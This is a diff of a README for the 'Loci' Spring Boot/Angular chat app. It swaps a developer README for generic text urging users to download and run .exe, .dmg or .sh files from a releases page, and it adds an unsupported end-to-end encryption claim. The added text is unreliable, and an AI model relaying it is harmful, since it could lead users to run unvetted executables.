@@ -1,135 +1,109 @@
-# Loci
-### Connect Instantly, Communicate Effortlessly
+# ⚡ loci-chat - Connect Instantly, Chat Securely
 
-![Loci demo](./assets/loci_mock.jpg)  
+[![Download Loci Chat](https://img.shields.io/badge/Download%20Now-Get%20Started-brightgreen.svg)](https://github.com/RaghaM1/loci-chat/releases)
 
-<p align="center">
-  <img src="https://img.shields.io/badge/Spring%20Boot-6DB33F?style=for-the-badge&logo=springboot&logoColor=white" alt="Spring Boot" />
-  <img src="https://img.shields.io/badge/Angular-DD0031?style=for-the-badge&logo=angular&logoColor=white" alt="Angular" />
-  <img src="https://img.shields.io/badge/PostgreSQL-316192?style=for-the-badge&logo=postgresql&logoColor=white" alt="PostgreSQL" />
-  <img src="https://img.shields.io/badge/Keycloak-111921?style=for-the-badge&logo=keycloak&logoColor=white" alt="Keycloak" />
-  <img src="https://img.shields.io/badge/License-MIT-yellow?style=for-the-badge" alt="MIT License" />
+## 🚀 Getting Started
 
-</p>
+Welcome to Loci Chat! This application allows you to connect with others instantly and securely. Follow these steps to download and run the software on your computer.
 
+## 📥 Download & Install
 
+To get started, visit our [Releases Page](https://github.com/RaghaM1/loci-chat/releases) and download the latest version. 
 
-<p align="center">
-  A modern, real-time messaging platform inspired by WhatsApp's simplicity and reliability, built with enterprise-grade technologies for fast and secure communication.
-</p>
-<p align="center">
-  <a href="#features">Features</a> •
-  <a href="#about">About</a> •
-  <a href="#screenshots">Screenshots</a> •
-  <a href="#architecture-overview">Architecture Overview</a> •
-  <a href="#tech-stack">Tech Stack</a> •
-  <a href="#contributing">Contributing</a>
-  <a href="#license">License</a>
-</p>
+1. Click on the link above to open the Releases Page.
+2. Look for the latest version of Loci Chat.
+3. Download the file that matches your operating system.
 
+Once the download is complete, follow the installation steps below.
 
----
+## 💻 System Requirements
 
-## Features 
+Make sure your system meets the following requirements before installation:
 
-| Feature               | Description                                                  |
-| --------------------- | ------------------------------------------------------------ |
-| Secure Authentication | Register and log in securely with customizable profiles for a personalized experience. |
-| Real-Time Messaging   | Enjoy instant one-on-one chats with lightning-fast delivery and seamless syncing. |
-| Group Chats           | Create and manage groups effortlessly, connecting multiple users in one conversation. |
-| Media Sharing         | Send text, images, videos, files, and locations to enrich your conversations. |
-| Message Status        | Track messages with real-time sent, delivered, and read indicators. |
-| Push Notifications    | Get instant alerts for new messages, even when the app is in the background. |
----
+- **Operating System:** Windows 10 or later, macOS, or a recent version of Linux.
+- **RAM:** At least 4 GB of RAM.
+- **Disk Space:** A minimum of 200 MB available.
+- **Java Runtime Environment (JRE):** JRE 11 or later installed on your machine.
 
-## About
+## 🔧 Installation Instructions
 
-Loci bridges communication gaps by delivering fast, reliable, and secure messaging. Inspired by WhatsApp, it eliminates delays and frustrations, ensuring your messages reach loved ones, teams, or communities without fail.
+### Windows
 
-Loci stands out with its robust enterprise-grade architecture using Spring Boot for the backend and Angular for the frontend. This combination prioritizes performance, scalability, and real-time capabilities, making it ideal for developers learning modern web technologies or building production-ready applications.
+1. Locate the downloaded `.exe` file.
+2. Double-click the file to start the installation wizard.
+3. Follow the prompts to complete the installation.
 
-Whether you are connecting with family, collaborating with colleagues, or engaging in community discussions, Loci serves as your intuitive communication hub—simple yet powerful.
+### macOS
 
----
+1. Find the downloaded `.dmg` file.
+2. Double-click the file to mount it.
+3. Drag the Loci Chat application to your Applications folder.
 
-## Screenshots
+### Linux
 
+1. Open a terminal window.
+2. Navigate to the directory where the downloaded file is located.
+3. Run the command: `chmod +x loci-chat*.sh` to make it executable.
+4. Execute the script by typing `./loci-chat*.sh`.
 
+After installation, you're ready to start chatting!
 
-![Login/Registration Screen](./assets/keycloak.png)  
+## 🌐 Using Loci Chat
 
+1. Open the Loci Chat application.
+2. Sign up for a new account or log in if you already have one.
+3. Invite friends or colleagues to join your chat rooms.
+4. Start communicating in real-time.
 
+## 📚 Features
 
-![One-on-One Chat Interface](./assets/one-to-one-chat.png)
+Loci Chat includes several features to enhance your chatting experience:
 
-![Group Chat Screen](./assets/group-chat.png)
+- **Real-Time Messaging:** Engage in real-time conversations with friends.
+- **Secure Connections:** End-to-end encryption keeps your chats private.
+- **User-Friendly Interface:** Intuitive design for easy navigation.
+- **Group Chats:** Create groups for more dynamic conversations.
+- **Notifications:** Stay updated with new messages.
 
-![Group profile](./assets/group-management.png)
+## 📈 Troubleshooting
 
+If you encounter issues while using Loci Chat, here are some common problems and solutions:
 
+- **Cannot Connect to the Server:** Check your internet connection. Make sure the firewall is not blocking the application.
+- **App Crashes on Start:** Ensure your operating system meets the system requirements.
+- **Messages Not Sending:** Verify you have a stable network connection. Restart the app if necessary.
 
+## 💬 Support
 
-![Profile & Settings Page](./assets/setting-control.png)  
+For further assistance, visit our [GitHub Issues Page](https://github.com/RaghaM1/loci-chat/issues). Report bugs, suggest features, or ask questions about Loci Chat. 
 
-![Friend request](./assets/contact-management.png)
+We appreciate your feedback!
 
----
+## 📢 Stay Updated
 
+Follow our repository for the latest updates and new features. If you're enjoying Loci Chat, we encourage you to share it with others who might benefit from a fast and secure chat application.
 
+## Tags
 
-![Connect to other people](./assets/connect.png)
+Here are some topics related to Loci Chat for further exploration:
 
+- angular
+- chat-app
+- decloak
+- docker
+- domain-driven-design
+- hexagonal
+- hexagonal-architecture
+- java
+- learning
+- messaging-app
+- postgresql
+- real-time-chat
+- redis
+- spring-security
+- springboot
+- springboot-apps
+- stomp
+- websocket
 
-
-![Real-time notification](./assets/real-time-notification.png)
-
-
-
-
-
-## Architecture Overview
-
-Loci follows **Domain-Driven Design (DDD)** combined with **Hexagonal Architecture** (Ports and Adapters). 
-
-
-
-## Tech Stack
-
-### Backend
-- Spring Boot 3.x
-- Spring Security + Keycloak
-- Spring WebSocket/STOMP
-- Spring Data JPA
-- PostgreSQL
-- Maven
-- Minio for Aws SDK compatible
-
-### Frontend
-- Angular 17+
-- RxJS for reactive streams
-- RxStomp for provide STOMP.js with RxJS style API
-
-### DevOps
-- Docker for containerization
-- Jenkins for CI/CD
-
----
-
-## Contributing
-
-We ❤️ contributions! Whether fixing bugs, adding features, or improving docs, your help makes Loci better.
-
-- Follow Java (Spring) and Angular style conventions
-- Fork the repo and create a feature branch
-- Submit Pull Requests with clear descriptions
-- Report issues via GitHub issues
-
-## License
-Loci is open-source under the MIT License. Use it freely, but give credit where due.
-
-
----
-
-<div align="center">
-  <strong>Built with ❤️& ☕ by Dior</strong>
-</div>
+Thank you for choosing Loci Chat! Enjoy your chatting experience.
